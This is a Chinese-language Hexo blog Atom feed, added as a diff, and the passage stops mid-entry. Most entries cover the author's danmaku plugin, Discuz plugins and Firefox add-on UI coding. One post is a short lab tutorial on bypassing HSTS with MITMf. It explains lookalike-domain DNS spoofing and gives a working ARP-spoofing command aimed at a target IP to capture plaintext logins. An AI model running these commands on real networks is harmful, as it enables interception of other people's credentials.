@@ -1,0 +1,766 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Yaseng</title>
+  <subtitle>By pass the token</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="yaseng.org/"/>
+  <updated>2016-09-01T13:27:52.000Z</updated>
+  <id>yaseng.org/</id>
+  
+  <author>
+    <name>Yaseng</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>网页弹幕插件 jquery.barrager.js hexo 集成</title>
+    <link href="yaseng.org/jquery-barrager-js-for-hexo.html"/>
+    <id>yaseng.org/jquery-barrager-js-for-hexo.html</id>
+    <published>2016-04-24T22:44:09.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>网页弹幕插件 jquery.barrager.js hexo 集成</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;网页弹幕插件 jquery.barrager.js hexo 集成&lt;/p&gt;
+
+    
+    </summary>
+    
+      <category term="Yaseng" scheme="yaseng.org/categories/Yaseng/"/>
+    
+    
+      <category term="jquery.barrager.js" scheme="yaseng.org/tags/jquery-barrager-js/"/>
+    
+      <category term="网页弹幕" scheme="yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
+    
+      <category term="hexo 弹幕" scheme="yaseng.org/tags/hexo-%E5%BC%B9%E5%B9%95/"/>
+    
+      <category term="jQuery 弹幕插件" scheme="yaseng.org/tags/jQuery-%E5%BC%B9%E5%B9%95%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网页弹幕插件 jquery.barrager.js WordPress集成</title>
+    <link href="yaseng.org/jquery-barrager-js-for-wordpress.html"/>
+    <id>yaseng.org/jquery-barrager-js-for-wordpress.html</id>
+    <published>2016-04-24T22:40:31.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>jquery.barrager.js WordPress集成</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;jquery.barrager.js WordPress集成&lt;/p&gt;
+
+    
+    </summary>
+    
+      <category term="原创作品" scheme="yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+    
+      <category term="jquery.barrager.js" scheme="yaseng.org/tags/jquery-barrager-js/"/>
+    
+      <category term="网页弹幕" scheme="yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
+    
+      <category term="jQuery 弹幕插件" scheme="yaseng.org/tags/jQuery-%E5%BC%B9%E5%B9%95%E6%8F%92%E4%BB%B6/"/>
+    
+      <category term="WordPress 插件" scheme="yaseng.org/tags/WordPress-%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Jquery.barrager.js  1.0 专业的网页弹幕插件</title>
+    <link href="yaseng.org/jquery-barrager-js-1-0.html"/>
+    <id>yaseng.org/jquery-barrager-js-1-0.html</id>
+    <published>2016-04-24T22:39:15.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>名称    jquery.barrager.js<br>版本    1.0<br>项目主页    <a href="http://yaseng.github.io/jquery.barrager.js" target="_blank" rel="external">http://yaseng.github.io/jquery.barrager.js</a><br>下载    <a href="https://github.com/yaseng/jquery.barrager.js" target="_blank" rel="external">https://github.com/yaseng/jquery.barrager.js</a><br>github    <a href="https://github.com/yaseng/jquery.barrager.js" target="_blank" rel="external">https://github.com/yaseng/jquery.barrager.js</a><br>Jquery.barrager.js 是一款优雅的网页弹幕插件、支持显示图片、文字以及超链接。支持速度、高度、颜色、数量等自定义。能轻松集成到论坛,博客等网站中。为网站带来更多的趣味和互动性。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;名称    jquery.barrager.js&lt;br&gt;版本    1.0&lt;br&gt;项目主页    &lt;a href=&quot;http://yaseng.github.io/jquery.barrager.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http
+    
+    </summary>
+    
+      <category term="原创作品" scheme="yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+    
+      <category term="jquery.barrager.js" scheme="yaseng.org/tags/jquery-barrager-js/"/>
+    
+      <category term="网页弹幕" scheme="yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网页弹幕插件 jquery.barrager.js  Discuz 集成</title>
+    <link href="yaseng.org/jquery-barrager-js-for-discuz.html"/>
+    <id>yaseng.org/jquery-barrager-js-for-discuz.html</id>
+    <published>2016-04-24T22:36:33.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>discuz 弹幕插件是一款基于discuz 论坛专业的弹幕插件,使用弹幕显示帖子,回复,指定内容等,为论坛带来更多的趣味和互动性。支持速度、高度、颜色、数量等自定义,兼容各种主流浏览器 。<br>插件地址:  <a href="http://addon.discuz.com/?@uauc_barrager.plugin" title="http://addon.discuz.com/?@uauc_barrager.plugin" target="_blank" rel="external">http://addon.discuz.com/?@uauc_barrager.plugin</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;discuz 弹幕插件是一款基于discuz 论坛专业的弹幕插件,使用弹幕显示帖子,回复,指定内容等,为论坛带来更多的趣味和互动性。支持速度、高度、颜色、数量等自定义,兼容各种主流浏览器 。&lt;br&gt;插件地址:  &lt;a href=&quot;http://addon.discuz.co
+    
+    </summary>
+    
+      <category term="Yaseng" scheme="yaseng.org/categories/Yaseng/"/>
+    
+      <category term="原创作品" scheme="yaseng.org/categories/Yaseng/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+    
+      <category term="discuz 插件" scheme="yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
+    
+      <category term="jquery.barrager.js" scheme="yaseng.org/tags/jquery-barrager-js/"/>
+    
+      <category term="网页弹幕" scheme="yaseng.org/tags/%E7%BD%91%E9%A1%B5%E5%BC%B9%E5%B9%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用mitmf 来绕过HSTS站点抓取登陆明文</title>
+    <link href="yaseng.org/hsts-bypass-with-mitmf.html"/>
+    <id>yaseng.org/hsts-bypass-with-mitmf.html</id>
+    <published>2016-04-17T00:15:54.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="HSTS简介"><a href="#HSTS简介" class="headerlink" title="HSTS简介"></a>HSTS简介</h3><p>HSTS是HTTP Strict Transport Security的缩写，即：”HTTP严格安全传输”。当浏览器第一次访问一个HSTS站点,会跳转到https页面,并种植hsts,下次再访问此站时,只要HSTS 还在有效期中,浏览器就会响应一个 HTTP 307 头,在不经过网络请求直接本地强制http跳转到https。这样可以有效防止基于SSLStrip的中间人攻击,对于伪造的证书，会显示错误，并且不允许用户忽略警告。<br><a id="more"></a><br>一个hsts 站点响应的例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  lab  curl  -I   www.taobao.com</span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Server: Tengine</span><br><span class="line">Date: Tue, 12 Apr 2016 06:18:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 258</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: https://www.taobao.com/</span><br><span class="line">Set-Cookie: thw=cn; Path=/; Domain=.taobao.com; Expires=Wed, 12-Apr-17 06:18:30 GMT;</span><br><span class="line">Strict-Transport-Security: max-age=31536000</span><br></pre></td></tr></table></figure></p>
+<!--more-->
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="mitmf-原理"><a href="#mitmf-原理" class="headerlink" title="mitmf 原理"></a>mitmf 原理</h4><p>用户首次访问某网站是不受HSTS保护的。这是因为首次访问时，浏览器还未收到HSTS，此时可以劫持站点绕过hsts 。<br>mitmf 就是利用这个缺陷绕过,当用户首次访问时,通过dns2proxy 伪造出一个具体迷惑性的http站点,例如 访问 www.taobao.com  跳转到 wwww.taobao.com 或者 访问login.taobao.com 跳转到 weblogin.taobao.com 。<br>具体代码  <a href="https://github.com/byt3bl33d3r/MITMf/blob/master/core/servers/DNS.py" target="_blank" rel="external">https://github.com/byt3bl33d3r/MITMf/blob/master/core/servers/DNS.py</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if hsts:</span><br><span class="line">    if qname in hstsconfig:</span><br><span class="line">        response = self.hstsbypass(hstsconfig[qname], qname, nameservers, d)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    elif qname[:4] == &apos;wwww&apos;:</span><br><span class="line">        response = self.hstsbypass(qname[1:], qname, nameservers, d)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    elif qname[:3] == &apos;web&apos;:</span><br><span class="line">        response = self.hstsbypass(qname[3:], qname, nameservers, d)</span><br><span class="line">        return response</span><br></pre></td></tr></table></figure></p>
+<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>kali执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install  mitmf</span><br><span class="line">mitmf -i eth0 --spoof --arp   --hsts --gateway   10.211.55.1  --targets   10.211.55.4</span><br></pre></td></tr></table></figure></p>
+<p>ubuntu 打开 www.xxxx.com<br>效果<br><a href="/uploads/2016/04/hsts_bypass.jpg"><img src="/uploads/2016/04/hsts_bypass-300x85.jpg" alt="" title="hsts_bypass"></a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>MITMf   <a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="external">https://github.com/byt3bl33d3r/MITMf</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;HSTS简介&quot;&gt;&lt;a href=&quot;#HSTS简介&quot; class=&quot;headerlink&quot; title=&quot;HSTS简介&quot;&gt;&lt;/a&gt;HSTS简介&lt;/h3&gt;&lt;p&gt;HSTS是HTTP Strict Transport Security的缩写，即：”HTTP严格安全传输”。当浏览器第一次访问一个HSTS站点,会跳转到https页面,并种植hsts,下次再访问此站时,只要HSTS 还在有效期中,浏览器就会响应一个 HTTP 307 头,在不经过网络请求直接本地强制http跳转到https。这样可以有效防止基于SSLStrip的中间人攻击,对于伪造的证书，会显示错误，并且不允许用户忽略警告。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术文章" scheme="yaseng.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="hsts" scheme="yaseng.org/tags/hsts/"/>
+    
+      <category term="hsts bypass" scheme="yaseng.org/tags/hsts-bypass/"/>
+    
+      <category term="mitmf" scheme="yaseng.org/tags/mitmf/"/>
+    
+      <category term="中间人攻击" scheme="yaseng.org/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>discuz 答题获取邀请码 qa_invite1.1</title>
+    <link href="yaseng.org/discuz-qa-invite-1-1.html"/>
+    <id>yaseng.org/discuz-qa-invite-1-1.html</id>
+    <published>2016-04-17T00:06:17.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h3><p>答题获取邀请码插件支持后台自定义题目，自定义生成邀请码，设置题目数量和合格数量，方便站长推广注册 。<br>插件地址  <a href="http://addon.discuz.com/?@qa_invite.plugin" title="http://addon.discuz.com/?@qa_invite.plugin" target="_blank" rel="external">http://addon.discuz.com/?@qa_invite.plugin</a><br><a href="/uploads/2016/04/qa_invite_1.jpg"><img src="/uploads/2016/04/qa_invite_1-300x113.jpg" alt="" title="qa_invite_1"></a><br><a id="more"></a></p>
+<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>后台下载安装，然后设置题目数量和答对题目数量，添加相应数量题目，并根据规则生成邀请码，邀请码注册请先在站点-注册设置里面，开启邀请码注册 。</p>
+<h3 id="插件功能"><a href="#插件功能" class="headerlink" title="插件功能"></a>插件功能</h3><p>1:后台自定义题目，自定义生成邀请码<br>2：简单方便管理题库内容<br>3：题目数量灵活多变</p>
+<h3 id="UaUc技术支持"><a href="#UaUc技术支持" class="headerlink" title="UaUc技术支持"></a>UaUc技术支持</h3><p>UaUcNet专业服务于广大discuz站长，提供插件私人定制，二次开发，模板定制，论坛疑难问题解答，搬家升级等服务！以专业成熟的技术水平，认真负责的工作态度，为您的论坛运营提供最贴心的技术服务！ 详情请联系UaUCNet团队客服 QQ：189333720  。<br><a href="tencent://message/?uin=189333720&amp;Site=http://www.uauc.net&amp;Menu=yes" target="_blank" rel="external"><img src="http://wpa.qq.com/pa?p=2:189333720:42" alt="QQ" title="QQ"></a> </p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;插件介绍&quot;&gt;&lt;a href=&quot;#插件介绍&quot; class=&quot;headerlink&quot; title=&quot;插件介绍&quot;&gt;&lt;/a&gt;插件介绍&lt;/h3&gt;&lt;p&gt;答题获取邀请码插件支持后台自定义题目，自定义生成邀请码，设置题目数量和合格数量，方便站长推广注册 。&lt;br&gt;插件地址  &lt;a href=&quot;http://addon.discuz.com/?@qa_invite.plugin&quot; title=&quot;http://addon.discuz.com/?@qa_invite.plugin&quot;&gt;http://addon.discuz.com/?@qa_invite.plugin&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/uploads/2016/04/qa_invite_1.jpg&quot;&gt;&lt;img src=&quot;/uploads/2016/04/qa_invite_1-300x113.jpg&quot; alt=&quot;&quot; title=&quot;qa_invite_1&quot;&gt;&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="原创作品" scheme="yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+    
+      <category term="discuz 插件" scheme="yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
+    
+      <category term="uauc作品" scheme="yaseng.org/tags/uauc%E4%BD%9C%E5%93%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>firefox 扩展开发笔记（三）:高级ui交互编程</title>
+    <link href="yaseng.org/firefox-addon-advanced-ui-develop.html"/>
+    <id>yaseng.org/firefox-addon-advanced-ui-develop.html</id>
+    <published>2016-03-31T04:34:44.000Z</published>
+    <updated>2016-09-12T09:36:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最新版本的Firefox 终于舍弃了鸡肋的xul布局,可以使用原生的html用作ui交互,插件界面中可以引入 bootstrap jQuery等库,大大简便了布局和高度自定义化,本文以一个随机自定义referer 实例来记录jpm 高级ui交互编程。</p>
+<h3 id="界面布局"><a href="#界面布局" class="headerlink" title="界面布局"></a>界面布局</h3><h4 id="ui-控件"><a href="#ui-控件" class="headerlink" title="ui 控件"></a>ui 控件</h4><p>官方api中提供的ui控件如下<br>1. ActionButton   动作按钮<br>2. ToggleButton   切换按钮<br>3. Frame           框架<br>4. Toolbar        工具栏<br>5. Sidebar        网站边栏<br>具体可以参考官方文档 <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui</a><br><code><br><a id="more"></a></code></p>
+<h4 id="panel"><a href="#panel" class="headerlink" title="panel"></a>panel</h4><p>面板为点击图标或者Toolbar 弹出的页面,声明代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> panel = panels.Panel(&#123;</span><br><span class="line">  width:<span class="number">420</span>,</span><br><span class="line">  height:<span class="number">420</span>,</span><br><span class="line">  contentURL: self.data.url(<span class="string">"panel.html"</span>),</span><br><span class="line">  contentScriptFile : [ self.data.url(<span class="string">"js/jquery.js"</span>),self.data.url(<span class="string">"../lib/panel.js"</span>)],</span><br><span class="line">  onHide: handleHide</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>/data/panel.html 文件为布局内容</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/bootstrap.min.css"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span><br><span class="line">    .group &#123;</span><br><span class="line">      margin-top:8px;</span><br><span class="line">      text-align:center;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"toggle"</span> /&gt;</span>开启</span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-info"</span>&gt;</span>referer 列表<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">rows</span>=<span class="string">"8"</span> <span class="attr">id</span>=<span class="string">"referer"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"label label-info"</span>&gt;</span>站点列表<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">rows</span>=<span class="string">"4"</span> <span class="attr">id</span>=<span class="string">"site"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"group"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>  <span class="attr">id</span>=<span class="string">"save"</span> &gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果如图<br><a href="/uploads/2016/03/panel_2.jpg"><img src="/uploads/2016/03/panel_2-300x285.jpg" alt="" title="panel_2"></a></p>
+<h4 id="tab-新页面"><a href="#tab-新页面" class="headerlink" title="tab 新页面"></a>tab 新页面</h4><p>panel 界面只适合弹出小型对话框,功能繁琐的页面则需要一个新全浏览器页面。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tabs = <span class="built_in">require</span>(<span class="string">"sdk/tabs"</span>);</span><br><span class="line">tabs.open(data.url(<span class="string">"option.html"</span>));</span><br></pre></td></tr></table></figure>
+<p>效果<br><a href="/uploads/2016/03/tab_3.jpg"><img src="/uploads/2016/03/tab_3-300x63.jpg" alt="" title="tab_3"></a></p>
+<h3 id="事件响应"><a href="#事件响应" class="headerlink" title="事件响应"></a>事件响应</h3><p>引入对应js文件之后就可以和网页一样写事件响应了,为了简便代码还可以引入jQuery库。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contentScriptFile : [ self.data.url(<span class="string">"js/jquery.js"</span>),self.data.url(<span class="string">"../lib/panel.js"</span>)],</span><br></pre></td></tr></table></figure>
+<p>响应代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> btn_toggle = $(<span class="string">"#toggle"</span>);</span><br><span class="line">    <span class="keyword">var</span> btn_save = $(<span class="string">"#save"</span>);</span><br><span class="line">    <span class="keyword">var</span> text_data= $(<span class="string">"#referer"</span>);</span><br><span class="line">    <span class="keyword">var</span> text_site= $(<span class="string">"#site"</span>);</span><br><span class="line">   <span class="comment">//初始化界面</span></span><br><span class="line">    self.port.on(<span class="string">"init"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">enable,referer,site</span>) </span>&#123;</span><br><span class="line">        btn_toggle.attr(<span class="string">"checked"</span>, enable);</span><br><span class="line">        text_data.val(referer);</span><br><span class="line">        text_site.val(site);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//切换事件</span></span><br><span class="line">    btn_toggle.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//prefs['enable']= this.checked;</span></span><br><span class="line">        self.port.emit(<span class="string">"toggle"</span>, <span class="keyword">this</span>.checked);    </span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//保存事件</span></span><br><span class="line">    btn_save.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        self.port.emit(<span class="string">"save"</span>,text_data.val(),text_site.val());    </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>ui控件与插件代码交互需要通过一个port对象,提供消息发送和接收,事件交互。<br>官方文档<br><a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Guides/Content_Scripts/port</a></p>
+<p>当点击切换按钮时,对应的交互代码为</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">panel.port.on(<span class="string">"toggle"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">enable</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  prefs[<span class="string">'enable'</span>] = enable ;</span><br><span class="line">  <span class="keyword">if</span>(enable)&#123;</span><br><span class="line"></span><br><span class="line">    btn_enable();</span><br><span class="line">    httpRequestObserver.register();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    btn_disable();</span><br><span class="line">    httpRequestObserver. unregister();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>又如  main.js 中调用panel.js </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span>  default_referer=[</span><br><span class="line"><span class="string">'http://www.baidu.com'</span>,</span><br><span class="line"><span class="string">'http://www.google.com'</span>,</span><br><span class="line"><span class="string">'http://www.hao123.com'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> default_site=[<span class="string">'127.0.0.1'</span>];</span><br><span class="line"><span class="keyword">if</span> (!ss.storage.referer)&#123;</span><br><span class="line">  <span class="comment">//赋值</span></span><br><span class="line">  ss.storage.referer=default_referer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ss.storage.site)&#123;</span><br><span class="line"></span><br><span class="line">  ss.storage.site=default_site;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取值</span></span><br><span class="line"><span class="keyword">var</span>  strReferer=ss.storage.referer.join(<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">var</span>  strSite=ss.storage.site.join(<span class="string">'\n'</span>);</span><br><span class="line">panel.port.emit(<span class="string">"init"</span>,prefs[<span class="string">'enable'</span>],strReferer,strSite);</span><br></pre></td></tr></table></figure>
+<h3 id="数据储存"><a href="#数据储存" class="headerlink" title="数据储存"></a>数据储存</h3><p>数据储存的api  sdk/simple-storage,可以自由存取各种数据对象。<br>官方demo</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ss = <span class="built_in">require</span>(<span class="string">"sdk/simple-storage"</span>);</span><br><span class="line">ss.storage.myArray = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>];</span><br><span class="line">ss.storage.myBoolean = <span class="literal">true</span>;</span><br><span class="line">ss.storage.myNull = <span class="literal">null</span>;</span><br><span class="line">ss.storage.myNumber = <span class="number">3.1337</span>;</span><br><span class="line">ss.storage.myObject = &#123; a: <span class="string">"foo"</span>, b: &#123; c: <span class="literal">true</span> &#125;, d: <span class="literal">null</span> &#125;;</span><br><span class="line">ss.storage.myString = <span class="string">"O frabjous 